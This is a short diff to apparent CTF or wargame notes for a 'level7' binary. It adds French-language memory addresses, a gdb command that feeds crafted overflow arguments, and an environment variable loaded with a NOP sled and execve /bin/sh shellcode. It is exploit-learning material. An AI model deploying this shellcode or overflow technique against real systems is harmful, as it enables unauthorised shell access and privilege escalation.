@@ -69,8 +69,24 @@ main:
 0x08048601 <+224>:	leave
 0x08048602 <+225>:	ret
 
+addresse de eip : 0xbffff71c
+addresse du shellcode : 0xbffff047
+
+gdb --args /home/user/level7/level7 `python -c "print '\x90' * 20 + '\xcc''\xcf''\xff''\xbf'"` `python -c "print '\x47''\xf0''\xff''\xbf'"`
+
+
+export BINSH=`python -c "print '\x90' * 10000 + '\x31''\xc0''\x50''\x68''\x2f''\x2f''\x73''\x68''\x68''\x2f''\x62''\x69''\x6e''\x89''\xe3''\x89''\xc1''\x89''\xc2''\xb0''\x0b''\xcd''\x80''\x31''\xc0''\x40''\xcd''\x80'"`
+
 
 b2 : 00000000
 b1 : 1000b2
 b4 : 00000000
 b3 : 2000b4
+
+
+ 0x08048703 - tilde
+ 0x08049960 - g
+ 0x0804A008 - b1[0]
+ 0x0804A018 - b1[1]
+ 0x0804A028 - b3[0]
+ 0x0804A038 - b3[1]
